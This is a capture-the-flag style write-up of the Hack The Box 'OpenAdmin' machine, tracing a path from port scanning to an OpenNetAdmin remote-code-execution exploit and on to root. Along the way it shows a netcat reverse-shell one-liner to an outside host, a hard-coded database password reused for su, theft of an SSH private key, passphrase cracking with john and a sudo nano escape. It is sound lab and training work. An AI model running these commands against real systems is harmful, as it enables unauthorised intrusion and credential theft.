---
title: OpenAdmin - easy HTB
date: 2023-10-10 10:11:53 +/-0800
categories: [writeup, hackthebox]
writeup: :title
permalink: /openadmin
tags: [htb, writeup, easy, Linux, CVE, Privileges Escalation]     # TAG names should always be lowercase
---

- OS: **Linux**
- Difficulty: **Easy**
- Author: **4nh4ck1ne**

### Scanning 

the challenges start with a scan of the most common ports: `nmap -A 10.10.10.171 -T4`

```       
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

We can see it is an Ubuntu machine !

### Enumeration 

before walk on the app you can lauch a gobuster brute force scan: `gobuster dir -u http://10.10.10.171 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

```
/music                (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/artwork              (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/sierra               (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/]

```

If you go on `/music` you can see an bouton name login. 

![/music](https://github.com/TheF0rceAwak5ns/TheF0rceAwak5ns.github.io/blob/main/assets/OpenAdmin/music.png)

Yon are redirect to an web page `/ona`, it is an app named OpenNetAdmin lets if an exploit existe on this current version (v18.1.1).

![ona](https://github.com/TheF0rceAwak5ns/TheF0rceAwak5ns.github.io/blob/main/assets/OpenAdmin/Ona.png)

Seems that yes because on exploitdb can find a code to exploit the vulnerability more it is an rce, this vulnerability will give us directly access to the server. If we look for a POC in python that works well. [POC](https://github.com/amriunix/ona-rce/tree/master)

```
#install reqirements
pip3 install --user requests

#Get the POC
git clone https://github.com/amriunix/ona-rce.git

#lauche the exploit
python3 ona-rce.py exploit http://10.10.10.171/ona/
[*] OpenNetAdmin 18.1.1 - Remote Code Execution
[+] Connecting !
[+] Connected Successfully!
sh$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We are on the machine! I will migrate my shell to a tty shell thanks to a pwncat:

```
#lauch pwncat
pwncat :9001

#run the reverse connection
sh$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.3 9001 >/tmp/f
```

### Privileges Escalation

the first mouvement is www-data => jimmy so we now have a stable shell. To begin the elevation of privileges we will look at the files of the website at the password quetes.

in the site folders we can find in this directory /local/config a file named "database_settings.inc.php" containing a mysql database password.

```php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

I have tried to access the local database that which feasible but no information interested is there. I then try to reuse password on local users (joanna, jimmy) and that market for jimmy we are now jimmy : `su jimmy
#enter password n1nj4W4rri0R!`


Ok we are now jimmy user next is to become joanna.

If we are still looking in the web file you will necessarily see from the rating of/var/www. you will still find counting in /html we will say that this sounds the web file that we had everything with gobuster. If we look at the side of "internal" a whole new world offered to us. If we look at the confiuguration side of the apache2 server we can see that there is an active virtualhost on port 52846.

```
jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf 
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

Let’s look at the php file more pret including main.php: `cat main.php
`

```php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

it seems that this application displays the private key of the user joanna tries to curl the url and see the result: `curl http://localhost:52846/main.php`

BIIM we have joanna’s private key, try to connect with: 
```
chmod 600 id_rsa

ssh -i id_rsa joanna@10.10.10.171                           
Enter passphrase for key 'id_rsa': 
```

Thin the key is protected by a passphrase let’s try cracking with john.

```
ssh2john id_rsa > passphrase.txt

john passphrase.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

We have cracked the key we can now log in and enter the secret of the key.

ok we are now on user Joanna to start enumeration I directly look at the sudo rights.

```
sudo -l

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

So the user joanna can therefore launch the command/bin/nano/opt/priv without password with must root, well let’s look at [GTfobins](https://gtfobins.github.io/#+sudo)  if there is a way to abuse nano.

![gtfobins](https://github.com/TheF0rceAwak5ns/TheF0rceAwak5ns.github.io/blob/main/assets/OpenAdmin/Gtfobins.png)

the abuse of nano binary is done as follows:

```
sudo /bin/nano /opt/priv

#Press control and R touch
^R
#Press ctrl+x touche
^X
#run the command
reset; sh 1>&0 2>&0
```

you Get the root Great job !! 

![root](https://github.com/TheF0rceAwak5ns/TheF0rceAwak5ns.github.io/blob/main/assets/OpenAdmin/root.png)
